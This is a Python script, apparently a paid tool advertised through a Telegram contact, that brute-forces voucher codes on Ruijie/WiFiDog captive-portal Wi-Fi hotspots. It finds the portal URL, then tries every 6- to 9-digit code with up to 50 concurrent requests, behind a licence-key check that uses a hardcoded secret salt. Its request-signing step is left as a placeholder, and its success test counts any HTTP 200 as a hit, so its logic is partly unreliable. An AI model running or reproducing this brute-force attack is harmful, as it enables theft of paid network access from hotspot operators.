import asyncio
import aiohttp
import subprocess
import os
import time
import socket
import hashlib
from urllib.parse import urlparse, parse_qs
from colorama import init, Fore, Style

init(autoreset=True)

# လုံခြုံရေးအတွက် အပိုင်းပိုင်း ခွဲထားတဲ့ Secret (ဖတ်ရခက်အောင် လုပ်ထားတာပါ)
_SECRET_PARTS = ["khantlay", "992_Owner", "_Secret_", "2024"]
SECRET_SALT = "".join(_SECRET_PARTS)

# ==========================================
# ဖုန်းရဲ့ Local IP ကို ယူခြင်း
# ==========================================
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # ဖုန်း IP ကို ရှာတဲ့ နည်းလမ်း
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

# ==========================================
# Key နှင့် သက်တမ်း စစ်ဆေးခြင်း
# ==========================================
def verify_key_with_expiry(user_key, ip_address):
    try:
        parts = user_key.split('-')
        if len(parts) != 2:
            return False, "Key ပုံစံ မမှန်ပါ။ (Format Error)"
            
        expiry_timestamp = int(parts[0])
        provided_hash = parts[1]
        
        # ၁။ သက်တမ်း ကုန်သွားပြီလား အရင်စစ်မယ်
        current_time = int(time.time())
        if current_time > expiry_timestamp:
            return False, "သင့် Key သက်တမ်း ကုန်ဆုံးသွားပါပြီ။"
            
        # ၂။ ဒီဖုန်း IP အတွက် Key မှန်ရဲ့လား (Hash စစ်ခြင်း)
        text = f"{ip_address}{SECRET_SALT}{expiry_timestamp}"
        expected_hash = hashlib.sha256(text.encode()).hexdigest()[:16].upper()
        
        if provided_hash == expected_hash:
            days_left = (expiry_timestamp - current_time) / 86400
            return True, f"သက်တမ်း ကျန်ရှိသေးသည် - {days_left:.1f} ရက်"
        else:
            return False, "Key မှားယွင်းနေပါသည်။ (ဒီဖုန်း IP အတွက် Key မဟုတ်ပါ)"
            
    except Exception:
        return False, "Key ဖတ်လို့ မရပါ။ ပြန်စစ်ဆေးပါ။"

def show_login_ui(ip):
    os.system('clear')
    print(f"""
{Fore.CYAN}╔══════════════════════════════════════════════════╗
{Fore.CYAN}║       {Fore.MAGENTA}VOUCHER CHECKER - LOGIN SYSTEM         {Fore.CYAN}║
{Fore.CYAN}╠══════════════════════════════════════════════════╣
{Fore.CYAN}║ {Fore.GREEN}Owner : {Fore.YELLOW}khantlay992                              {Fore.CYAN}║
{Fore.CYAN}║ {Fore.GREEN}Your IP: {Fore.RED}{ip.ljust(38)} {Fore.CYAN}║
{Fore.CYAN}╚══════════════════════════════════════════════════╝
    """)

# ==========================================
# Network & Scanner Logic
# ==========================================
async def check_internet():
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    headers = {"User-Agent": "Mozilla/5.0"}
    try:
        async with aiohttp.ClientSession(headers=headers) as session:
            async with session.get(test_url, allow_redirects=False, timeout=3) as response:
                return response.status == 204
    except:
        return False

async def get_full_portal_url():
    test_url = "http://connectivitycheck.gstatic.com/generate_204"
    headers = {"User-Agent": "Mozilla/5.0"}
    async with aiohttp.ClientSession(headers=headers) as session:
        try:
            async with session.get(test_url, allow_redirects=False, timeout=5) as response:
                if response.status in [301, 302, 307, 308]:
                    return response.headers.get('Location')
        except:
            pass
    return None

def parse_wifidog_url(url):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)
    extracted_data = {k: v[0] for k, v in params.items()}
    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
    return base_url, extracted_data

class Scanner:
    def __init__(self, base_url, base_params, code_length):
        self.base_url = base_url
        self.base_params = base_params
        self.code_length = code_length
        self.tried = 0
        self.found = {}
        self.start_time = time.time()
        self.current_code = "000000"
        self.max_concurrent = 50 
        self.semaphore = asyncio.Semaphore(self.max_concurrent)
        self.is_running = True

    async def ui_updater(self):
        while self.is_running:
            elapsed = time.time() - self.start_time
            speed = self.tried / elapsed if elapsed > 0 else 0
            
            os.system('clear')
            print(f"{Fore.CYAN}╔══════════════════════════════════════════════════╗")
            print(f"{Fore.CYAN}║ {Fore.MAGENTA}Owner: khantlay992 {Fore.CYAN}| {Fore.YELLOW}Ruijie Fast Scanner {Fore.CYAN}║")
            print(f"{Fore.CYAN}╠══════════════════════════════════════════════════╣")
            print(f"{Fore.CYAN}║ {Fore.WHITE}Speed       : {Fore.GREEN}{speed:.2f} codes/sec                  {Fore.CYAN}║")
            print(f"{Fore.CYAN}║ {Fore.WHITE}Checker Code: {Fore.MAGENTA}{self.current_code}                            {Fore.CYAN}║")
            print(f"{Fore.CYAN}║ {Fore.WHITE}Tried Code  : {Fore.YELLOW}{self.tried}                              {Fore.CYAN}║")
            
            if self.found:
                hit_str = ", ".join([f"{k} ({v:.1f}s)" for k, v in self.found.items()])
                print(f"{Fore.CYAN}║ {Fore.WHITE}Found Code  : {Fore.GREEN}{hit_str[:35]}... {Fore.CYAN}║")
            else:
                print(f"{Fore.CYAN}║ {Fore.WHITE}Found Code  : {Fore.RED}None                                   {Fore.CYAN}║")
                
            print(f"{Fore.CYAN}╚══════════════════════════════════════════════════╝")
            print(f"{Fore.YELLOW}[*] ရပ်ချင်ပါက Ctrl+C နှိပ်ပါ။")
            await asyncio.sleep(0.1)

    async def attempt_code(self, session, code):
        async with self.semaphore:
            if not self.is_running: return
            self.tried += 1
            self.current_code = code 
            
            params = self.base_params.copy()
            params['voucher_code'] = code 
            
            # ⚠️ သတိပြုရန် - တကယ့် Ruijie API ရဲ့ Sign တွက်နည်းကို ဒီနေရာမှာ ထည့်ရပါမယ်
            # params['sign'] = generate_sign(code, params.get('chap_challenge', ''))
            
            try:
                async with session.get(self.base_url, params=params, timeout=3) as response:
                    text = await response.text()
                    # ကုဒ်မှန်သွားရင် ပြန်လာမယ့် Response စာသားကို စစ်ပါ
                    if "success" in text.lower() or response.status == 200:
                        hit_time = time.time() - self.start_time
                        self.found[code] = hit_time
            except Exception:
                pass 

    async def run(self):
        ui_task = asyncio.create_task(self.ui_updater())
        max_val = int('9' * self.code_length)
        
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(max_val + 1):
                if not self.is_running: break
                code = str(i).zfill(self.code_length)
                tasks.append(self.attempt_code(session, code))
                if len(tasks) >= self.max_concurrent:
                    await asyncio.gather(*tasks)
                    tasks = []
                    await asyncio.sleep(0.01) 
            if tasks:
                await asyncio.gather(*tasks)
                
        self.is_running = False
        await ui_task

# ==========================================
# Main Program
# ==========================================
async def main():
    my_ip = get_local_ip()
    show_login_ui(my_ip)
    
    print(Fore.YELLOW + "Key လိုအပ်ပါက ဒီမှာ လာရောက်ဝယ်ယူနိုင်ပါသည် -")
    print(Fore.CYAN + "👉 t.me/khantlay992 👈\n")
    
    user_key = input(Fore.YELLOW + "Key ကို ရိုက်ထည့်ပါ: ").strip()
    
    is_valid, message = verify_key_with_expiry(user_key, my_ip)
    
    if is_valid:
        print(Fore.GREEN + f"\n[+] အောင်မြင်ပါသည်! {message}")
        print(Fore.GREEN + "[+] ခဏစောင့်ပါ... Scanner စတင်ပါမည်။")
        time.sleep(2)
    else:
        print(Fore.RED + f"\n[!] {message}")
        print(Fore.YELLOW + "Key အသစ်ရယူရန် သင့် IP ကို ပို့ပြီး ဒီမှာ ဆက်သွယ်ပါ - t.me/khantlay992")
        return

    if await check_internet():
        print(Fore.RED + "[!] လက်ရှိ Wi-Fi က အင်တာနက် ရနေပါသည်။ (Voucher မလိုအပ်ပါ)။")
        return

    print(Fore.CYAN + "\n[*] Portal URL ရှာဖွေနေပါသည်...")
    portal_url = await get_full_portal_url()
    
    if not portal_url:
        portal_url = input(Fore.YELLOW + "URL ကို ကိုယ်တိုင်ထည့်ပါ: ")

    base_url, params = parse_wifidog_url(portal_url)

    print("\n" + Fore.YELLOW + "ကုဒ် အရှည် ရွေးချယ်ပါ (1=6, 2=7, 3=8, 4=9): ")
    choice = input("ရွေးချယ်ပါ: ")
    code_length = {'1': 6, '2': 7, '3': 8, '4': 9}.get(choice, 6)

    scanner = Scanner(base_url, params, code_length)
    try:
        await scanner.run()
    except KeyboardInterrupt:
        scanner.is_running = False
        print(Fore.RED + "\n[!] ရပ်ဆိုင်းလိုက်ပါပြီ။")

if __name__ == "__main__":
    asyncio.run(main())